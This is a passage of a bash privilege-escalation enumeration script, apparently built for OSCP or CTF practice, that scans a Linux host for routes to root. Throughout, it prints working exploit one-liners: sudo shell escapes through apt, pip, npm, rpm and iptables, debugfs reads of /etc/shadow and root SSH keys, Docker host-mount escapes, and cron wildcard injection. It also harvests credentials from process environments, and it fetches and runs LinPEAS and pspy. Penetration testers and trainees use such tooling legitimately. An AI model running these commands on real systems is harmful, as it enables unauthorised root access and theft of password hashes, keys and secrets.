    current_groups=$(groups 2>/dev/null)

    if echo "$current_groups" | grep -qw "disk"; then
        quick_win "User is in 'disk' group! Raw disk access: debugfs /dev/sda1 → can read any file including /etc/shadow"
        info "Try: debugfs /dev/sda1 -R 'cat /etc/shadow'"
        info "Or:  debugfs /dev/sda1 -R 'cat /root/.ssh/id_rsa'"
    fi

    if echo "$current_groups" | grep -qw "shadow"; then
        quick_win "User is in 'shadow' group! Can read /etc/shadow directly → crack password hashes"
    fi

    # Also check video, adm, and other interesting groups
    if echo "$current_groups" | grep -qw "video"; then
        interesting "User is in 'video' group - can access framebuffer (screenshot capture)"
    fi

    if echo "$current_groups" | grep -qw "adm"; then
        interesting "User is in 'adm' group - can read log files in /var/log"
    fi

    if echo "$current_groups" | grep -qw "staff"; then
        interesting "User is in 'staff' group - may have write access to /usr/local"
    fi

    if ! echo "$current_groups" | grep -qwE "disk|shadow"; then
        info "Not in disk or shadow groups"
    fi
}

check_localhost_services() {
    section "Localhost-Only Services"

    info "Checking for services listening on 127.0.0.1 only (potential targets)..."

    local listen_output
    if command -v ss &> /dev/null; then
        listen_output=$(ss -tlnp 2>/dev/null)
    elif command -v netstat &> /dev/null; then
        listen_output=$(netstat -tlnp 2>/dev/null)
    else
        info "Neither ss nor netstat available"
        return
    fi

    echo "$listen_output" > "$OUTPUT_DIR/localhost_services.txt"

    # Check for specific interesting services on localhost
    if echo "$listen_output" | grep -qE "127\.0\.0\.1:6379|::1:6379"; then
        quick_win "Redis on localhost (port 6379)! Try: redis-cli CONFIG SET dir /var/spool/cron/ && SET payload for cron-based RCE"
    fi

    if echo "$listen_output" | grep -qE "127\.0\.0\.1:2375|127\.0\.0\.1:2376|::1:2375|::1:2376"; then
        quick_win "Docker API on localhost! curl http://127.0.0.1:2375/containers/json → container escape"
    fi

    if echo "$listen_output" | grep -qE "127\.0\.0\.1:3306|::1:3306"; then
        interesting "MySQL on localhost (port 3306). Check for root without password: mysql -u root"
        # Try passwordless login
        if command -v mysql &> /dev/null; then
            if mysql -u root -e "SELECT 1" 2>/dev/null; then
                quick_win "MySQL root login WITHOUT password! UDF or file write possible"
            fi
        fi
    fi

    if echo "$listen_output" | grep -qE "127\.0\.0\.1:5432|::1:5432"; then
        interesting "PostgreSQL on localhost (port 5432). Check for trust auth: psql -U postgres"
        if command -v psql &> /dev/null; then
            if psql -U postgres -c "SELECT 1" 2>/dev/null; then
                quick_win "PostgreSQL trust auth! Can read/write files via COPY: COPY (SELECT '') TO '/etc/cron.d/shell'"
            fi
        fi
    fi

    if echo "$listen_output" | grep -qE "127\.0\.0\.1:27017|::1:27017"; then
        interesting "MongoDB on localhost (port 27017). Check for no-auth: mongosh"
    fi

    if echo "$listen_output" | grep -qE "127\.0\.0\.1:11211|::1:11211"; then
        interesting "Memcached on localhost (port 11211). May contain cached credentials"
    fi

    if echo "$listen_output" | grep -qE "127\.0\.0\.1:9200|::1:9200"; then
        interesting "Elasticsearch on localhost (port 9200). Typically no auth: curl http://127.0.0.1:9200/_search"
    fi
}

check_python_perl_path_hijacking() {
    section "Python/Perl Path Hijacking"

    info "Checking for writable directories in Python sys.path and Perl library paths..."

    # Python sys.path check
    if command -v python3 &> /dev/null || command -v python &> /dev/null; then
        local python_cmd
        python_cmd=$(command -v python3 || command -v python)

        local writable_pypath=0
        $python_cmd -c "import sys; print('\n'.join(sys.path))" 2>/dev/null | while IFS= read -r pydir; do
            if [[ -n "$pydir" && -d "$pydir" && -w "$pydir" ]]; then
                quick_win "Writable Python sys.path directory: $pydir (drop malicious .py module to hijack imports)"
                writable_pypath=1
            fi
        done

        # Check PYTHONPATH env var
        if [[ -n "$PYTHONPATH" ]]; then
            echo "$PYTHONPATH" | tr ':' '\n' | while IFS= read -r pydir; do
                if [[ -d "$pydir" && -w "$pydir" ]]; then
                    quick_win "Writable PYTHONPATH directory: $pydir"
                fi
            done
        fi
    else
        info "Python not available"
    fi

    # Perl library path check
    if command -v perl &> /dev/null; then
        perl -e 'print join("\n", @INC)' 2>/dev/null | while IFS= read -r perldir; do
            if [[ -n "$perldir" && "$perldir" != "." && -d "$perldir" && -w "$perldir" ]]; then
                quick_win "Writable Perl @INC directory: $perldir (drop malicious .pm module to hijack imports)"
            fi
        done

        # Check PERL5LIB
        if [[ -n "$PERL5LIB" ]]; then
            echo "$PERL5LIB" | tr ':' '\n' | while IFS= read -r perldir; do
                if [[ -d "$perldir" && -w "$perldir" ]]; then
                    quick_win "Writable PERL5LIB directory: $perldir"
                fi
            done
        fi
    else
        info "Perl not available"
    fi
}

check_writable_profile_files() {
    section "Writable /etc/profile, /etc/bash.bashrc, /etc/environment"

    info "Checking global shell init files for writability (code exec on login)..."

    local found=0

    for target in /etc/profile /etc/bash.bashrc /etc/bashrc /etc/environment /etc/profile.d; do
        if [[ -e "$target" ]]; then
            if [[ -f "$target" && -w "$target" ]]; then
                quick_win "Writable login init file: $target (append reverse shell → runs for every user login)"
                found=1
            elif [[ -d "$target" && -w "$target" ]]; then
                quick_win "Writable directory: $target (drop a .sh script → sourced by every login shell)"
                found=1
            fi
        fi
    done

    # Check individual files in /etc/profile.d/
    if [[ -d /etc/profile.d ]]; then
        find /etc/profile.d -type f -writable 2>/dev/null | while IFS= read -r profscript; do
            quick_win "Writable profile.d script: $profscript (executes on every login)"
            found=1
        done
    fi

    if [[ $found -eq 0 ]]; then
        info "No writable global shell init files found"
    fi
}

check_writable_motd() {
    section "Writable /etc/update-motd.d/ (Root on SSH Login)"

    info "Checking update-motd.d scripts for writability..."

    if [[ -d /etc/update-motd.d ]]; then
        if [[ -w /etc/update-motd.d ]]; then
            quick_win "/etc/update-motd.d/ directory is WRITABLE! Drop a script → runs as root on every SSH login"
        fi

        find /etc/update-motd.d -type f -writable 2>/dev/null | while IFS= read -r motdscript; do
            quick_win "Writable MOTD script: $motdscript (runs as root on SSH login)"
        done

        find /etc/update-motd.d -type f 2>/dev/null > "$OUTPUT_DIR/motd_scripts.txt"
        if [[ -s "$OUTPUT_DIR/motd_scripts.txt" ]]; then
            info "MOTD scripts present:"
            cat "$OUTPUT_DIR/motd_scripts.txt"
        fi
    else
        info "/etc/update-motd.d does not exist"
    fi
}

check_writable_init_scripts() {
    section "Writable /etc/init.d/ and /etc/rc.local"

    info "Checking init scripts and rc.local for writability..."

    # /etc/rc.local
    if [[ -e /etc/rc.local ]]; then
        if [[ -w /etc/rc.local ]]; then
            quick_win "/etc/rc.local is WRITABLE! Append commands → runs as root at boot"
        else
            info "/etc/rc.local exists but is not writable"
        fi
    else
        # Check if we can create it
        if [[ -w /etc ]]; then
            interesting "/etc/rc.local does not exist but /etc is writable - could create it"
        fi
    fi

    # /etc/init.d/
    if [[ -d /etc/init.d ]]; then
        if [[ -w /etc/init.d ]]; then
            quick_win "/etc/init.d/ directory is WRITABLE! Drop a service script → runs as root"
        fi

        find /etc/init.d -type f -writable 2>/dev/null | while IFS= read -r initscript; do
            quick_win "Writable init script: $initscript (modify for root code exec at boot)"
        done
    fi
}

check_mysql_as_root() {
    section "MySQL Running as Root (UDF Exploitation)"

    info "Checking if MySQL/MariaDB is running as root..."

    local mysql_procs
    mysql_procs=$(ps aux 2>/dev/null | grep -E "[m]ysqld|[m]ariadbd")

    if [[ -n "$mysql_procs" ]]; then
        local mysql_user
        mysql_user=$(echo "$mysql_procs" | awk '{print $1}' | head -1)

        if [[ "$mysql_user" == "root" ]]; then
            quick_win "MySQL/MariaDB is running as ROOT! UDF exploitation possible"
            info "Steps: 1) Access MySQL 2) Write UDF .so to plugin dir 3) CREATE FUNCTION sys_exec RETURNS INT SONAME 'exploit.so'"
            info "UDF payload: https://www.exploit-db.com/exploits/1518"

            # Check if we can access MySQL
            if command -v mysql &> /dev/null; then
                if mysql -u root -e "SELECT @@plugin_dir" 2>/dev/null; then
                    quick_win "MySQL root access without password + running as root = guaranteed RCE"
                fi

                # Check for FILE privilege
                local file_priv
                file_priv=$(mysql -u root -e "SELECT file_priv FROM mysql.user WHERE user='root'" 2>/dev/null)
                if echo "$file_priv" | grep -qi "Y"; then
                    interesting "MySQL root has FILE privilege (can read/write system files)"
                fi
            fi
        else
            info "MySQL is running as user: $mysql_user (not root)"
        fi
    else
        info "MySQL/MariaDB is not running"
    fi
}

check_writable_path_dirs() {
    section "Writable PATH Directories"

    info "Checking which directories in PATH are writable by current user..."

    local found_writable=0
    echo "$PATH" | tr ':' '\n' | sort -u | while IFS= read -r dir; do
        if [[ -d "$dir" && -w "$dir" ]]; then
            # Count how many SUID/root-owned scripts reference this dir
            local suid_count
            suid_count=$(find "$dir" -perm -4000 -type f 2>/dev/null | wc -l)
            if [[ $suid_count -gt 0 ]]; then
                quick_win "Writable PATH dir with $suid_count SUID binaries: $dir"
            else
                interesting "Writable PATH directory: $dir (place malicious binary to hijack commands)"
            fi
            found_writable=1
        fi
    done

    if [[ $found_writable -eq 0 ]]; then
        info "No writable PATH directories found"
    fi
}

check_doas_config() {
    section "Doas Configuration"

    info "Checking for doas.conf permit nopass entries..."

    if [[ -f /etc/doas.conf ]]; then
        interesting "doas.conf found:"
        cat /etc/doas.conf 2>/dev/null > "$OUTPUT_DIR/doas_conf.txt"
        cat /etc/doas.conf 2>/dev/null

        # Check for nopass entries
        if grep -qiE "permit\s+nopass" /etc/doas.conf; then
            quick_win "doas.conf has 'permit nopass' entries!"
            grep -iE "permit\s+nopass" /etc/doas.conf | while IFS= read -r line; do
                echo -e "  ${GREEN}→ $line${NC}"
            done
        fi

        # Check if current user has doas rights
        local current_user
        current_user=$(whoami)
        if grep -qE "permit.*(${current_user}|:$(id -gn))" /etc/doas.conf 2>/dev/null; then
            quick_win "Current user ($current_user) has entries in doas.conf!"
            grep -E "permit.*(${current_user}|:$(id -gn))" /etc/doas.conf
        fi
    elif command -v doas &> /dev/null; then
        info "doas binary exists but /etc/doas.conf not found or not readable"
    else
        info "doas not installed"
    fi

    # Also check /usr/local/etc/doas.conf (FreeBSD/OpenBSD style)
    if [[ -f /usr/local/etc/doas.conf ]]; then
        interesting "doas.conf found at /usr/local/etc/doas.conf:"
        cat /usr/local/etc/doas.conf 2>/dev/null

        if grep -qiE "permit\s+nopass" /usr/local/etc/doas.conf; then
            quick_win "doas.conf (local) has 'permit nopass' entries!"
            grep -iE "permit\s+nopass" /usr/local/etc/doas.conf
        fi
    fi
}

check_package_manager_sudo() {
    section "Package Manager Sudo"

    info "Checking if user can run package managers as sudo..."

    local sudo_output
    sudo_output=$(timeout 3 sudo -n -l 2>/dev/null)

    if [[ -z "$sudo_output" ]]; then
        info "Cannot read sudo -l without password"
        return
    fi

    # apt/apt-get
    if echo "$sudo_output" | grep -qE "(apt-get|apt)\b"; then
        quick_win "Can run apt/apt-get as sudo! Root via: sudo apt-get update -o APT::Update::Pre-Invoke::='/bin/sh'"
        info "Alt: sudo apt-get changelog apt 2>&1 | less → !/bin/sh"
    fi

    # pip/pip3
    if echo "$sudo_output" | grep -qE "(pip|pip3)\b"; then
        quick_win "Can run pip as sudo! Root via: TF=\$(mktemp -d) && echo 'import os;os.execl(\"/bin/sh\",\"sh\",\"-c\",\"sh <$(tty) >$(tty) 2>$(tty)\")' > \$TF/setup.py && sudo pip install \$TF"
    fi

    # npm
    if echo "$sudo_output" | grep -qE "npm\b"; then
        quick_win "Can run npm as sudo! Root via: TF=\$(mktemp -d) && echo '{\"scripts\":{\"preinstall\":\"/bin/sh\"}}' > \$TF/package.json && sudo npm --prefix \$TF install"
    fi

    # yum
    if echo "$sudo_output" | grep -qE "yum\b"; then
        quick_win "Can run yum as sudo! Root via custom plugin: sudo yum -c yum.conf localinstall with embedded commands"
    fi

    # dnf
    if echo "$sudo_output" | grep -qE "dnf\b"; then
        quick_win "Can run dnf as sudo! Similar to yum exploitation via plugins"
    fi

    # gem
    if echo "$sudo_output" | grep -qE "gem\b"; then
        quick_win "Can run gem as sudo! Root via: sudo gem open -e '/bin/sh -c /bin/sh' rdoc"
    fi

    # cpan
    if echo "$sudo_output" | grep -qE "cpan\b"; then
        quick_win "Can run cpan as sudo! Root via: sudo cpan → ! exec '/bin/bash'"
    fi

    # snap
    if echo "$sudo_output" | grep -qE "snap\b"; then
        interesting "Can run snap as sudo - may be exploitable with crafted snap package"
    fi

    # dpkg
    if echo "$sudo_output" | grep -qE "dpkg\b"; then
        quick_win "Can run dpkg as sudo! Root via: sudo dpkg -l → !/bin/sh (uses pager)"
    fi

    # rpm
    if echo "$sudo_output" | grep -qE "rpm\b"; then
        quick_win "Can run rpm as sudo! Root via: sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
    fi

    if ! echo "$sudo_output" | grep -qE "(apt-get|apt|pip|pip3|npm|yum|dnf|gem|cpan|snap|dpkg|rpm)\b"; then
        info "No package managers found in sudo rights"
    fi
}

###########################################
# EP PDF CHECKS (from OSCP/CTF notes)
###########################################

check_iptables_modprobe() {
    section "iptables --modprobe Exploit"
    local sudo_output
    sudo_output=$(sudo -l 2>/dev/null)
    if echo "$sudo_output" | grep -qi "iptables"; then
        quick_win "Can run iptables via sudo! Exploit with: echo '/bin/bash -i' > /tmp/run-me && chmod +x /tmp/run-me && sudo iptables -L -t nat --modprobe=/tmp/run-me"
    else
        info "No sudo iptables found"
    fi
}

check_fail2ban_writable() {
    section "Fail2ban Writable Actions"
    if id | grep -q 'fail2ban\|root'; then
        info "Checking fail2ban action files..."
    fi
    local writable_actions
    writable_actions=$(find /etc/fail2ban/action.d/ -writable 2>/dev/null)
    if [[ -n "$writable_actions" ]]; then
        quick_win "Writable fail2ban action files found! Modify actionban to: chmod u+s /bin/bash, then trigger ban (5 failed SSH logins)"
        echo "$writable_actions"
    fi
    # Check if in fail2ban group
    if id | grep -q 'fail2ban'; then
        quick_win "User is in fail2ban group! Can modify action.d files -> modify actionban -> trigger ban -> root"
    fi
    if [[ -z "$writable_actions" ]] && ! id | grep -q 'fail2ban'; then
        info "No writable fail2ban actions found"
    fi
}

check_docker_socket() {
    section "Docker Socket Access"
    if [[ -e /var/run/docker.sock ]]; then
        if [[ -r /var/run/docker.sock ]]; then
            quick_win "Docker socket /var/run/docker.sock is READABLE! Root via: docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
        elif [[ -w /var/run/docker.sock ]]; then
            quick_win "Docker socket /var/run/docker.sock is WRITABLE! Can create privileged containers"
        else
            info "Docker socket exists but not accessible"
        fi
    fi
    # Check if mounted inside a container
    if grep -q 'docker.sock' /proc/1/mountinfo 2>/dev/null; then
        quick_win "docker.sock is mounted inside this container! Container escape possible"
    fi
    # Check for exposed Docker API on localhost
    if command -v curl &>/dev/null; then
        if curl -s --connect-timeout 2 http://127.0.0.1:2375/version 2>/dev/null | grep -q "ApiVersion"; then
            quick_win "Docker API exposed on localhost:2375 WITHOUT TLS! Instant root: curl -s http://127.0.0.1:2375/containers/create -X POST -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Binds\":[\"/:/mnt\"]}'"
        fi
    fi
}

check_wildcard_injection() {
    section "Wildcard Injection in Cron"
    local cron_wildcards
    cron_wildcards=$(cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null | grep -v "^#" | grep -E "\*" | grep -iE "tar|rsync|chown|chmod|zip")
    if [[ -n "$cron_wildcards" ]]; then
        quick_win "Cron jobs using wildcards with exploitable commands (tar/rsync/chown/chmod/zip):"
        echo "$cron_wildcards"
        echo ""
        echo -e "${YELLOW}    Exploit for tar: touch '/path/--checkpoint=1' && touch '/path/--checkpoint-action=exec=sh shell.sh'${NC}"
        echo -e "${YELLOW}    Exploit for rsync: touch '/path/-e sh shell.sh'${NC}"
        echo -e "${YELLOW}    Exploit for chown: symlink attack via --reference${NC}"
    else
        info "No wildcard injection vectors found in cron"
    fi
}

check_process_credentials() {
    section "Process Memory Credential Leaks"
    # Check ptrace scope
    local ptrace_scope
    ptrace_scope=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
    if [[ "$ptrace_scope" == "0" ]]; then
        interesting "ptrace_scope=0 (unrestricted)! Can dump any process memory with gcore/gdb"
    fi
    # Check for passwords in process arguments
    local pass_procs
    pass_procs=$(ps aux 2>/dev/null | grep -iE 'pass|pwd|secret|token|key' | grep -v grep | grep -v "$$")
    if [[ -n "$pass_procs" ]]; then
        interesting "Processes with potential credentials in arguments:"
        echo "$pass_procs"
    fi
    # Check environment vars of accessible processes
    for pid in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | head -50); do
        local env_pass
        env_pass=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|pwd|secret|token|key|api' 2>/dev/null)
        if [[ -n "$env_pass" ]]; then
            interesting "Credentials in /proc/$pid/environ ($(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' | head -c 60)):"
            echo "$env_pass"
        fi
    done
}

check_container_escape() {
    section "Container Detection & Escape"
    local in_container=false
    # Detect container
    if [[ -f /.dockerenv ]]; then
        interesting "Running inside Docker container (/.dockerenv exists)"
        in_container=true
    fi
    if grep -qE 'docker|lxc|kubepods|containerd' /proc/1/cgroup 2>/dev/null; then
        interesting "Running inside container (cgroup indicates docker/lxc/k8s)"
        in_container=true
    fi
    if [[ "$in_container" == true ]]; then
        # Check for escape vectors
        if [[ -e /var/run/docker.sock ]]; then
            quick_win "docker.sock mounted inside container! Mount host FS: docker run -v /:/host alpine chroot /host"
        fi
        if capsh --print 2>/dev/null | grep -q "cap_sys_admin"; then
            quick_win "Container has CAP_SYS_ADMIN! Can mount host filesystem: mount /dev/sda1 /mnt"
        fi
        if [[ -d /host ]] || mount 2>/dev/null | grep -q "/ type.*rw"; then
            interesting "Host filesystem may be mounted. Check /host, /mnt, or mount output"
        fi
    else
        info "Not running in a container"
    fi
}

check_logrotate_exploit() {
    section "Logrotate Exploitation (logrotten)"
    local logrotate_ver
    logrotate_ver=$(logrotate --version 2>&1 | head -1)
    if [[ -n "$logrotate_ver" ]]; then
        info "Logrotate version: $logrotate_ver"
        # Check for writable log directories used by logrotate
        local writable_logdirs
        writable_logdirs=$(cat /etc/logrotate.conf /etc/logrotate.d/* 2>/dev/null | grep -oE '/[a-zA-Z0-9/_.-]+\.log' | sort -u | while read logfile; do
            local dir=$(dirname "$logfile")
            [[ -w "$dir" ]] && echo "$dir ($logfile)"
        done)
        if [[ -n "$writable_logdirs" ]]; then
            interesting "Writable directories used by logrotate (logrotten CVE-2019-18276 potential):"
            echo "$writable_logdirs"
        fi
    fi
}

check_snap_exploitation() {
    section "Snap / Snapd Exploitation"
    if command -v snap &>/dev/null; then
        local snap_ver
        snap_ver=$(snap version 2>/dev/null | grep "snapd" | awk '{print $2}')
        info "Snapd version: $snap_ver"
        # dirty_sock affects < 2.37.1
        if [[ -n "$snap_ver" ]]; then
            local major minor patch
            IFS='.' read -r major minor patch <<< "$snap_ver"
            if [[ $major -lt 2 ]] || ([[ $major -eq 2 ]] && [[ $minor -lt 37 ]]); then
                quick_win "Snapd < 2.37.1 — vulnerable to dirty_sock (CVE-2019-7304)! Creates sudo user"
            fi
        fi
        # Check for devmode snaps
        local devmode_snaps
        devmode_snaps=$(snap list 2>/dev/null | grep -i devmode)
        if [[ -n "$devmode_snaps" ]]; then
            interesting "Snaps in devmode (install hooks run as root):"
            echo "$devmode_snaps"
        fi
    fi
}

check_git_hooks() {
    section "Writable Git Hooks"
    local writable_hooks
    writable_hooks=$(find / -name ".git" -type d 2>/dev/null | while read gitdir; do
        if [[ -w "$gitdir/hooks/" ]]; then
            echo "$gitdir/hooks/ (writable!)"
        fi
    done)
    if [[ -n "$writable_hooks" ]]; then
        interesting "Writable git hooks directories (code exec when root does git pull/commit):"
        echo "$writable_hooks"
    else
        info "No writable git hooks found"
    fi
}

check_ansible_puppet() {
    section "Automation Tools (Ansible/Puppet/Chef)"
    # Ansible
    local ansible_writable
    ansible_writable=$(find /etc/ansible /opt/ansible /var/lib/awx 2>/dev/null -writable -name "*.yml" -o -writable -name "*.yaml" 2>/dev/null | head -10)
    if [[ -n "$ansible_writable" ]]; then
        quick_win "Writable Ansible playbooks found! Add: '- shell: chmod u+s /bin/bash'"
        echo "$ansible_writable"
    fi
    # Check cron for ansible
    local ansible_cron
    ansible_cron=$(cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -i ansible)
    if [[ -n "$ansible_cron" ]]; then
        interesting "Ansible in cron:"
        echo "$ansible_cron"
    fi
    # Puppet
    local puppet_writable
    puppet_writable=$(find /etc/puppet /opt/puppet 2>/dev/null -writable -name "*.pp" 2>/dev/null | head -5)
    if [[ -n "$puppet_writable" ]]; then
        quick_win "Writable Puppet manifests found!"
        echo "$puppet_writable"
    fi
}

check_dbus_services() {
    section "D-Bus Custom Services"
    if command -v busctl &>/dev/null; then
        local custom_dbus
        custom_dbus=$(busctl list 2>/dev/null | grep -vE "org.freedesktop|org.bluez|org.gnome" | grep -v "^:" | tail -n +2)
        if [[ -n "$custom_dbus" ]]; then
            interesting "Non-standard D-Bus services (may accept unprivileged method calls):"
            echo "$custom_dbus" | head -15
        fi
    fi
    # Writable D-Bus policies
    local writable_dbus
    writable_dbus=$(find /etc/dbus-1/ /usr/share/dbus-1/ -writable -name "*.conf" 2>/dev/null)
    if [[ -n "$writable_dbus" ]]; then
        quick_win "Writable D-Bus policy files:"
        echo "$writable_dbus"
    fi
}

check_unmounted_partitions() {
    section "Unmounted Partitions & FSTAB"
    # User-mountable entries
    local user_mount
    user_mount=$(grep -E '\buser\b|\busers\b' /etc/fstab 2>/dev/null | grep -v "^#")
    if [[ -n "$user_mount" ]]; then
        interesting "User-mountable entries in /etc/fstab:"
        echo "$user_mount"
    fi
    # Unmounted block devices
    if command -v lsblk &>/dev/null; then
        local unmounted
        unmounted=$(lsblk -o NAME,FSTYPE,MOUNTPOINT 2>/dev/null | awk '$2 != "" && $3 == ""' | grep -v "loop")
        if [[ -n "$unmounted" ]]; then
            interesting "Unmounted partitions (may contain old data/backups):"
            echo "$unmounted"
        fi
    fi
}

check_postgresql_as_root() {
    section "PostgreSQL Exploitation"
    if ps aux 2>/dev/null | grep -q "[p]ostgres"; then
        local pg_user
        pg_user=$(ps aux 2>/dev/null | grep "[p]ostgres" | head -1 | awk '{print $1}')
        info "PostgreSQL running as: $pg_user"
        if [[ "$pg_user" == "root" ]]; then
            quick_win "PostgreSQL running as ROOT! If you have DB access: COPY (SELECT '') TO '/root/.ssh/authorized_keys'"
        fi
        # Check pg_hba.conf for trust auth
        local pg_hba
        pg_hba=$(find / -name "pg_hba.conf" -readable 2>/dev/null | head -1)
        if [[ -n "$pg_hba" ]]; then
            if grep -qE "^\s*local\s+.*trust" "$pg_hba"; then
                quick_win "PostgreSQL uses trust authentication! Connect without password: psql -U postgres"
            fi
            interesting "pg_hba.conf found at: $pg_hba"
        fi
    fi
}

###########################################
# LINPEAS INTEGRATION
###########################################

run_linpeas() {
    section "Running LinPEAS"

    info "Downloading LinPEAS..."

    # Try to download linpeas
    if command -v curl &> /dev/null; then
        curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o "$OUTPUT_DIR/linpeas.sh" 2>/dev/null
    elif command -v wget &> /dev/null; then
        wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O "$OUTPUT_DIR/linpeas.sh" 2>/dev/null
    else
        echo -e "${RED}[-] Neither curl nor wget available. Cannot download LinPEAS${NC}"
        return
    fi

    if [[ -f "$OUTPUT_DIR/linpeas.sh" ]]; then
        info "Running LinPEAS (this may take a few minutes)..."
        chmod +x "$OUTPUT_DIR/linpeas.sh"
        bash "$OUTPUT_DIR/linpeas.sh" -a > "$OUTPUT_DIR/linpeas_output.txt" 2>&1

        interesting "LinPEAS completed. Output saved to: $OUTPUT_DIR/linpeas_output.txt"

        # Parse LinPEAS output for quick wins
        if grep -q "99%" "$OUTPUT_DIR/linpeas_output.txt"; then
            quick_win "LinPEAS found HIGH probability privesc vectors! Check linpeas_output.txt"
        fi
    fi
}

###########################################
# PSPY INTEGRATION
###########################################

run_pspy() {
    section "Running pspy64 (Process Monitor)"

    info "Downloading pspy64..."

    if command -v curl &> /dev/null; then
        curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o "$OUTPUT_DIR/pspy64" 2>/dev/null
    elif command -v wget &> /dev/null; then
        wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -O "$OUTPUT_DIR/pspy64" 2>/dev/null
    else
        echo -e "${RED}[-] Neither curl nor wget available. Cannot download pspy${NC}"
        return
    fi

    if [[ -f "$OUTPUT_DIR/pspy64" ]]; then
        chmod +x "$OUTPUT_DIR/pspy64"
        info "Running pspy64 for 60 seconds..."
        timeout 60 "$OUTPUT_DIR/pspy64" > "$OUTPUT_DIR/pspy_output.txt" 2>&1

        interesting "pspy completed. Check output for cron jobs and processes: $OUTPUT_DIR/pspy_output.txt"
    fi
}

###########################################
# MAIN EXECUTION
###########################################

main() {
    info "Starting privilege escalation enumeration..."
    info "Output directory: $OUTPUT_DIR"
    echo ""

    # Quick wins (always run these)
    check_sudo_nopasswd
    check_suid_binaries
    check_capabilities
    check_writable_etc_passwd
    check_writable_etc_shadow
    check_docker_group
    check_nfs_exports
    check_cron_writable
    check_path_hijacking
    check_ssh_keys
    check_polkit

    # Full enumeration mode
    if [[ "$FULL_MODE" == true ]]; then
        check_kernel_exploits
        check_interesting_files
        check_history_files
        check_running_services
        check_writable_services
        check_tmux_screen
        check_mail
        check_wild_cards

        # Extended checks
        check_gtfobins_crossref
        check_ld_preload_sudo
        check_systemd_timers
        check_shared_object_hijacking
        check_cve_2021_3156
        check_cve_2023_22809
        check_writable_ld_preload_conf
        check_lxd_lxc_group
        check_disk_shadow_group
        check_localhost_services
        check_python_perl_path_hijacking
        check_writable_profile_files
        check_writable_motd
        check_writable_init_scripts
        check_mysql_as_root
        check_writable_path_dirs
        check_doas_config
        check_package_manager_sudo

        # EP PDF checks
        check_iptables_modprobe
        check_fail2ban_writable
        check_docker_socket
        check_wildcard_injection
        check_process_credentials
        check_container_escape
        check_logrotate_exploit
        check_snap_exploitation
        check_git_hooks
        check_ansible_puppet
        check_dbus_services
        check_unmounted_partitions
        check_postgresql_as_root
    fi

    # LinPEAS
    if [[ "$RUN_LINPEAS" == true ]]; then
        run_linpeas
    fi

    # pspy
    if [[ "$RUN_PSPY" == true ]]; then
        run_pspy
    fi

    # Summary
    echo ""
    section "ENUMERATION COMPLETE"
    echo -e "${GREEN}╔═══════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                    SUMMARY                          ║${NC}"
    echo -e "${GREEN}╠═══════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║  Quick Wins Found:        ${QUICK_WINS}                           ║${NC}"
    echo -e "${GREEN}║  Interesting Finds:       ${INTERESTING_FINDS}                           ║${NC}"
    echo -e "${GREEN}║  Output Directory:        ${OUTPUT_DIR}  ║${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════════════════╝${NC}"

    if [[ $QUICK_WINS -gt 0 ]]; then
        echo ""
        echo -e "${GREEN}[!!!] CHECK QUICK_WINS.txt FOR EASY PRIVESC PATHS${NC}"
        echo ""
        if [[ -f "$OUTPUT_DIR/QUICK_WINS.txt" ]]; then
            cat "$OUTPUT_DIR/QUICK_WINS.txt"
        fi
    fi

    echo ""
    info "All results saved to: $OUTPUT_DIR"
    info "Key files to review:"
    echo "  - QUICK_WINS.txt (if exists)"
    echo "  - interesting_finds.txt"
    echo "  - suid_binaries.txt"
    echo "  - capabilities.txt"
    echo "  - linpeas_output.txt (if LinPEAS was run)"
}

# Run main
main
